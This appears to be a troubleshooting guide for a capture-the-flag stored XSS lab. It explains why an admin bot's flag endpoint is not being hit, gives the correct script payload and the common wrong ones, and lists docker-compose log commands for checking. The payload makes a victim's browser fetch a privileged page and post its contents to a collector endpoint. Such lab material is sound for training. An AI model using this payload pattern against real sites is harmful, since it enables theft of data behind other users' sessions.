# Payload Verification Guide

Based on your logs, the collector is receiving requests but the flag endpoint is NOT being called. This means your XSS is executing, but it's not fetching the flag first.

## The Problem

Your logs show:
- ✅ `POST /collector` - Collector is being called
- ❌ `flag=false` - Flag endpoint is NOT being called

This means your payload is executing, but it's sending data to the collector WITHOUT fetching the flag first.

## Correct Payload Format

Make sure your payload is EXACTLY this (copy-paste to avoid typos):

```html
<script>
fetch('/admin/flag')
  .then(r => r.text())
  .then(flag => {
    fetch('/collector', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: 1, data: flag })
    });
  });
</script>
```

## Common Mistakes

### ❌ Wrong: Sending test data directly
```html
<script>
fetch('/collector', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ user_id: 1, data: 'test' })
});
</script>
```
This sends "test" to collector, but doesn't fetch the flag!

### ❌ Wrong: Missing the flag fetch
```html
<script>
fetch('/collector', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ user_id: 1, data: 'FLAG{test}' })
});
</script>
```
This sends a fake flag, but doesn't fetch the real one!

### ✅ Correct: Fetch flag first, then send to collector
```html
<script>
fetch('/admin/flag')
  .then(r => r.text())
  .then(flag => {
    fetch('/collector', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ user_id: 1, data: flag })
    });
  });
</script>
```

## How to Verify

1. **Check web server logs** to see what data the collector received:
   ```bash
   sudo docker-compose logs web --tail 50 | grep collector
   ```
   Look for: `[collector] Received request: user_id=1, data preview=...`
   
   - If you see `data preview=FLAG{...}` → Good! Flag was fetched
   - If you see `data preview=test` or something else → You're not fetching the flag

2. **Check bot logs** to see if flag endpoint was called:
   ```bash
   sudo docker-compose logs admin-bot --tail 50 | grep flag
   ```
   Look for: `[professor-bot] ✓ Flag endpoint accessed`
   
   - If you see this → Flag endpoint was called ✓
   - If you don't see this → Flag endpoint was NOT called ❌

## Step-by-Step Fix

1. **Make sure you're using the correct payload** (copy-paste from above)
2. **Submit it in the Message field** (not Subject)
3. **Wait 20 seconds** after submitting
4. **Check the logs** to verify:
   - Flag endpoint was called
   - Flag content was received
   - Collector received the flag (not test data)
5. **Check `/my-captures`** to see if the flag appears

## Still Not Working?

If the flag endpoint is still not being called, there might be a JavaScript error. Check bot logs for:
- `[professor-bot] Console error:` - JavaScript errors
- `[professor-bot] Page error:` - Page-level errors

These will tell you what's wrong with your payload.

